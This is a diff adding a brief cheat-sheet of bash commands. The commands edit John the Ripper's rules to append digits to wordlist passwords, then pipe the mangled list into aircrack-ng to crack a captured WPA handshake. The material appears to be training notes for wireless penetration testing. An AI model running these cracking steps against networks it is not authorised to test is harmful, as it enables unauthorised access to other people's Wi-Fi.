@@ -1,0 +1,28 @@
+
+* Example passwords
+@code bash
+grep -i password /usr/share/john/password.lst
+@end
+___
+
+* Change john rules
+@code bash
+sudo vim /etc/john/john.conf
+
+# Add two numbers to the end of each password
+$[0-9]$[0-9]
+$[0-9]$[0-9]$[0-9]
+@end
+___
+
+* Testing changes made to new --stdout
+@code bash
+john --wordlist=/usr/share/john/password.lst --rules --stdout | grep -i Password123
+@end
+___
+
+* Piping output to aircrack-ng
+@code bash
+john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e wifu -w - ~/wpa-01.cap
+@end
+___
